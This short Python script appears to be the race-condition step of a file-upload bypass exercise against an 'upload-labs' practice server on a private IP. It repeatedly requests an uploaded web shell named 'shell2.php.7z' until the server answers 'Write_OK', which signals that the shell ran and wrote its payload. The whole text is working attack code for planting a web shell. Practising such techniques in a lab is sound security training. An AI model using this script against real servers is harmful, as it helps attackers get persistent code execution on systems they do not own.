import requests, time

while True:
    resp = requests.get('http://192.168.112.188/upload-labs/upload/shell2.php.7z')
    if resp.status_code == 200 and resp.text == 'Write_OK':
        print(resp.text)
        break
    # time.sleep(0.05)